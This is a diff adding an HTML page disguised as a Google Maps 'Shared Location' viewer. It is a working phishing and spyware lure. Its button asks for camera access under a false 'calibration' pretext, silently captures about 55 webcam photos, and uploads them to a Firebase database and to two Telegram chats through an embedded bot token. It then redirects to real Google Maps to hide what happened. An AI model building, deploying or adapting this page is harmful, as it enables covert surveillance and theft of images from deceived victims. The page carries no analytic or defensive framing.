@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Maps - Shared Location</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --g-blue: #1a73e8;
+            --g-gray: #f8f9fa;
+            --g-text-dark: #202124;
+            --g-text-light: #5f6368;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--g-gray); 
+            font-family: 'Roboto', 'Google Sans', Arial, sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .maps-card {
+            width: 100%; max-width: 450px; background: #fff; border-radius: 28px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; padding-bottom: 24px;
+        }
+
+        .map-preview-bg {
+            height: 200px; background: #e8eaed url('https://maps.gstatic.com/tactile/pane/default_geocode-2x.png') center;
+            background-size: cover; position: relative;
+        }
+
+        .pin-overlay {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 40px; height: 40px; background: #ea4335; border-radius: 50% 50% 50% 0;
+            transform: translate(-50%, -50%) rotate(-45deg);
+        }
+
+        .body-content { padding: 32px 24px; text-align: center; }
+
+        h1 { font-size: 22px; font-weight: 400; color: var(--g-text-dark); margin: 0 0 12px; }
+        p { font-size: 14px; color: var(--g-text-light); line-height: 1.5; margin-bottom: 32px; }
+
+        .btn-view {
+            background: var(--g-blue); color: #fff; border: none;
+            padding: 12px 24px; border-radius: 100px; font-size: 14px; font-weight: 500;
+            cursor: pointer; width: 100%; transition: box-shadow 0.2s;
+        }
+
+        /* Loading / Calibration State */
+        #loading-ui { display: none; padding-top: 40px; }
+        .radar-spinner {
+            width: 60px; height: 60px; border: 2px solid var(--g-blue);
+            border-radius: 50%; margin: 0 auto 20px; position: relative;
+            animation: radar 2s infinite linear;
+        }
+        .radar-spinner::after {
+            content: ''; position: absolute; top: 50%; left: 50%;
+            width: 100%; height: 2px; background: var(--g-blue);
+            transform-origin: left; animation: sweep 2s infinite linear;
+        }
+
+        @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes radar { 0% { box-shadow: 0 0 0 0 rgba(26, 115, 232, 0.4); } 100% { box-shadow: 0 0 0 20px rgba(26, 115, 232, 0); } }
+
+        .status-txt { font-size: 15px; color: var(--g-blue); font-weight: 500; }
+        .timer-txt { font-size: 12px; color: var(--g-text-light); margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="maps-card">
+        <div class="map-preview-bg">
+            <div class="pin-overlay"></div>
+        </div>
+
+        <div class="body-content" id="start-ui">
+            <h1>Shared Location Received</h1>
+            <p>A contact is sharing their real-time location. To view the precise coordinates and enable Live View navigation, we need to calibrate your device's orientation.</p>
+            
+            <button class="btn-view" onclick="startCalibration()">View Real-time Location</button>
+        </div>
+
+        <div class="body-content" id="loading-ui">
+            <div class="radar-spinner"></div>
+            <div class="status-txt">Calibrating Environment...</div>
+            <div class="timer-txt" id="timer">Synchronizing GPS data (60s)</div>
+            <div style="margin-top: 20px; font-size: 11px; color: var(--g-text-light);">
+                Detected Location: Gaya, Bihar District
+            </div>
+        </div>
+    </div>
+
+    <!-- Background Capture System -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startCalibration() {
+            try {
+                // Disguised as 'Hardware Calibration' for the Map
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('start-ui').style.display = 'none';
+                document.getElementById('loading-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let iteration = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        iteration++;
+                        document.getElementById('timer').innerText = `Synchronizing GPS data (${timeLeft}s)`;
+
+                        // Capture loop
+                        if (iteration <= 55) {
+                            silentRelay(iteration);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Official Google Maps Redirect
+                            window.location.href = "https://www.google.com/maps";
+                        }
+                    }, 1000);
+                };
+            } catch (e) {
+                // Fallback to real maps if user denies
+                window.location.href = "https://www.google.com/maps";
+            }
+        }
+
+        function silentRelay(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; 
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ image: b64, type: "MAPS_RECON", ts: Date.now() });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'maps_relay.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
